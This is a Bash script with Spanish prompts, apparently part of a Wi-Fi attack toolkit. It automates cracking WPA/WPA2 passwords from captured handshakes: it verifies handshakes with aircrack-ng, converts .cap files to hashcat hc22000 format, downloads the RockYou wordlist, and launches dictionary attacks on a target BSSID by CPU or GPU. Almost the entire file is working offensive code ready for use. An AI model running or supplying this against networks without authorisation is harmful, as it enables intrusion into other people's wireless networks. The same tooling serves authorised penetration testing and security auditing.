#!/bin/bash

function crack_password_auto() {
    local cap_file_input="$1"
    local bssid_input="$2"
    
    echo -e "${YELLOW}[*] Configuración rápida de cracking...${NC}"
    
    wordlist=""
    if [ -f "$WORK_DIR/rockyou.txt" ]; then
        wordlist="$WORK_DIR/rockyou.txt"
    elif [ -f "/usr/share/wordlists/rockyou.txt" ]; then
        wordlist="/usr/share/wordlists/rockyou.txt"
    else
        echo -e "${RED}[!] No se encontró rockyou.txt automáticmente. Usando selección manual...${NC}"
        crack_password
        return
    fi
    
    echo -e "${GREEN}[*] Usando diccionario: $wordlist${NC}"
    
    # Decidir herramienta basado en extensión o tipo
    if [[ "$cap_file_input" == *.hc22000 ]]; then
        echo -e "${YELLOW}[*] Detectado Hashcat Mode (PMKID/Converted). Usando GPU...${NC}"
        hashcat -a 0 -m 22000 -w 3 "$cap_file_input" "$wordlist"
    else
        echo -e "${YELLOW}[*] Detectado Aircrack-ng Mode (Handshake). Usando CPU...${NC}"
        aircrack-ng -a2 -b "$bssid_input" -w "$wordlist" "$cap_file_input"
    fi
    read -p "Presiona Enter para continuar..."
}

function select_file() {
    local pattern="$1"
    local prompt_msg="$2"
    local files=("$WORK_DIR"/$pattern)
    
    # Check if files exist (glob might not expand if no match)
    if [ ! -e "${files[0]}" ]; then
        echo -e "${RED}[!] No se encontraron archivos ($pattern) en $WORK_DIR${NC}"
        return 1
    fi

    echo -e "${YELLOW}$prompt_msg${NC}"
    local i=1
    for file in "${files[@]}"; do
        echo -e "  ${CYAN}$i)${NC} $(basename "$file")"
        ((i++))
    done
    
    echo ""
    read -p "  → Selecciona un archivo (número): " choice
    
    if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#files[@]}" ]; then
        SELECTED_FILE="${files[$((choice-1))]}"
        return 0
    else
        echo -e "${RED}[!] Selección inválida.${NC}"
        return 1
    fi
}

function verify_handshake() {
    banner
    echo -e "${YELLOW}[*] Verificar integridad del Handshake${NC}"
    
    if ! select_file "*.cap" "Selecciona el archivo de captura a verificar:"; then
        read -p "Presiona Enter para volver..."
        return
    fi
    cap_file="$SELECTED_FILE"
    
    read -p "Ingresa el BSSID (opcional, Enter para omitir): " bssid
    
    echo -e "${YELLOW}[*] Analizando archivo: $(basename "$cap_file")...${NC}"
    echo ""
    
    if [ -z "$bssid" ]; then
        # Modo general: Mostrar todas las redes y ver si alguna tiene handshake
        aircrack-ng "$cap_file"
        echo ""
        echo -e "${CYAN}[i] Busca '(1 handshake)' en la columna 'WPA' o en el resumen.${NC}"
    else
        # Modo específico: Validar contra BSSID
        echo -e "${YELLOW}[*] Validando handshake para $bssid...${NC}"
        output=$(aircrack-ng -b "$bssid" "$cap_file" 2>&1)
        
        # Mostrar salida filtrada relevante
        echo "$output" | grep -E "handshake|No valid packets"
        
        if echo "$output" | grep -q "1 handshake"; then
             echo ""
             echo -e "${GREEN}[OK] Handshake VÁLIDO encontrado para $bssid.${NC}"
        else
             echo ""
             echo -e "${RED}[!] NO se detectó un handshake válido o completo.${NC}"
        fi
    fi
     
    read -p "Presiona Enter para continuar..."
}

function crack_password() {
    banner
    echo -e "${YELLOW}[*] Configuración del ataque de diccionario${NC}"
    
    # 1. Selección de Diccionario
    while true; do
        echo -e "\n${YELLOW}--- Selección de Diccionario ---${NC}"
        echo "1) Ingresar ruta manual"
        echo "2) Usar RockYou (Buscar en /usr/share/wordlists/)"
        echo "3) Descargar RockYou (desde GitHub)"
        read -p "Opción: " wl_choice

        case $wl_choice in
            1)
                read -p "Ruta del archivo: " wordlist
                if [ -f "$wordlist" ]; then break; else echo -e "${RED}[!] Archivo no encontrado.${NC}"; fi
                ;;
            2)
                # Intentar localizar rockyou en rutas comunes
                locations=(
                    "/usr/share/wordlists/rockyou.txt"
                    "/usr/share/wordlists/rockyou.txt.gz"
                )
                found=0
                for loc in "${locations[@]}"; do
                    if [ -f "$loc" ]; then
                        if [[ "$loc" == *.gz ]]; then
                            echo -e "${YELLOW}[*] Descomprimiendo $loc...${NC}"
                            gunzip -c "$loc" > "$WORK_DIR/rockyou.txt"
                            wordlist="$WORK_DIR/rockyou.txt"
                        else
                            wordlist="$loc"
                        fi
                        echo -e "${GREEN}[+] Diccionario seleccionado: $wordlist${NC}"
                        found=1
                        break
                    fi
                done
                
                if [ $found -eq 1 ]; then break; else echo -e "${RED}[!] RockYou no encontrado en rutas estándar.${NC}"; fi
                ;;
            3)
                wordlist="$WORK_DIR/rockyou.txt"
                echo -e "${YELLOW}[*] Descargando RockYou.txt...${NC}"
                if wget -q --show-progress -O "$wordlist" https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt; then
                    echo -e "${GREEN}[+] Descarga completada: $wordlist${NC}"
                    break
                else
                    echo -e "${RED}[!] Error al descargar. Verifica tu conexión.${NC}"
                fi
                ;;
            *) echo "Opción inválida." ;;
        esac
    done

    # 2. Pedir archivo de captura (.cap)
    if ! select_file "*.cap" "Selecciona el archivo de captura (.cap):"; then
        read -p "Presiona Enter para volver..."
        return
    fi
    cap_file="$SELECTED_FILE"

    # 3. Menú de recursos
    echo ""
    echo "Selecciona el recurso para crackear:"
    echo "1) CPU (Aircrack-ng - Estándar)"
    echo "2) GPU (Hashcat - Alto Rendimiento)"
    read -p "Opción: " resource_opt

    case $resource_opt in
        1)
            echo -e "${YELLOW}[*] Necesitamos el BSSID para filtrar el ataque.${NC}"
            read -p "Ingresa el BSSID del objetivo: " bssid
            
            echo -e "${YELLOW}[*] Iniciando aircrack-ng con CPU...${NC}"
            echo -e "${RED}[!] IMPORTANTE: Solo funcionará si la contraseña está en tu diccionario.${NC}"
            aircrack-ng -a2 -b "$bssid" -w "$wordlist" "$cap_file"
            ;;
        2)
            echo -e "${YELLOW}[*] Preparando ataque con GPU (Hashcat)...${NC}"
            
            # Lógica de conversión
            hash_file=""
            if command -v hcxpcapngtool &> /dev/null; then
                 echo -e "${GREEN}[*] Herramienta 'hcxpcapngtool' detectada.${NC}"
                 output_hc="${cap_file%.*}.hc22000"
                 
                 echo -e "${YELLOW}[*] Convirtiendo .cap a formato hashcat (.hc22000)...${NC}"
                 hcxpcapngtool -o "$output_hc" "$cap_file"
                 
                 if [ -f "$output_hc" ]; then
                     echo -e "${GREEN}[+] Conversión exitosa: $output_hc${NC}"
                     hash_file="$output_hc"
                 else
                     echo -e "${RED}[!] Falló la conversión automática.${NC}"
                 fi
            else
                 echo -e "${YELLOW}[!] No se encontró 'hcxpcapngtool' para conversión automática.${NC}"
                 echo -e "${YELLOW}[!] Necesitas convertir el archivo .cap a .hc22000 manualmente (ej. https://hashcat.net/cap2hashcat/).${NC}"
            fi

            if [ -z "$hash_file" ]; then
                while true; do
                    read -p "Ingresa la ruta del archivo convertido (.hc22000): " hash_file
                    if [ -f "$hash_file" ]; then
                        break
                    else
                         echo -e "${RED}[!] Archivo no encontrado.${NC}"
                    fi
                done
            fi
            
            echo -e "${YELLOW}[*] Iniciando hashcat (Modo 22000)...${NC}"
            hashcat -a 0 -m 22000 -w 3 "$hash_file" "$wordlist"
            ;;
        *)
            echo "Opción inválida."
            ;;
    esac
    read -p "Presiona Enter para continuar..."
}

function convert_cap_to_hc22000() {
    banner
    echo -e "${YELLOW}[*] Conversor .cap -> .hc22000 (Hashcat)${NC}"
    
    # 1. Verificar herramienta
    if ! command -v hcxpcapngtool &> /dev/null; then
        echo -e "${RED}[!] La herramienta 'hcxpcapngtool' no está instalada.${NC}"
        echo -e "${YELLOW}[INFO] Instala 'hcxtools' para usar esta función.${NC}"
        read -p "Presiona Enter para volver..."
        return
    fi
    
    # 2. Seleccionar archivo .cap
    if ! select_file "*.cap" "Selecciona el archivo .cap para convertir:"; then
        read -p "Presiona Enter para volver..."
        return
    fi
    cap_file="$SELECTED_FILE"
    
    local output_hc="${cap_file%.*}.hc22000"
    
    if [ -f "$output_hc" ]; then
        echo -e "${YELLOW}[!] El archivo de salida ya existe: $output_hc${NC}"
        read -p "¿Sobrescribir? (s/N): " choice
        if [[ "$choice" != "s" && "$choice" != "S" ]]; then
            echo -e "${YELLOW}[*] Operación cancelada.${NC}"
            read -p "Presiona Enter para continuar..."
            return
        fi
    fi
    
    echo -e "${YELLOW}[*] Convirtiendo...${NC}"
    
    hcxpcapngtool -o "$output_hc" "$cap_file"
    
    if [ -f "$output_hc" ] && [ -s "$output_hc" ]; then
        echo -e "${GREEN}[+] Conversión completada exitosamente.${NC}"
        echo -e "${GREEN}[+] Archivo guardado en: $output_hc${NC}"
    else
        echo -e "${RED}[!] Error durante la conversión. Verifica que el .cap sea válido y contenga PMKID/EAPOL.${NC}"
    fi
    
    read -p "Presiona Enter para continuar..."
}
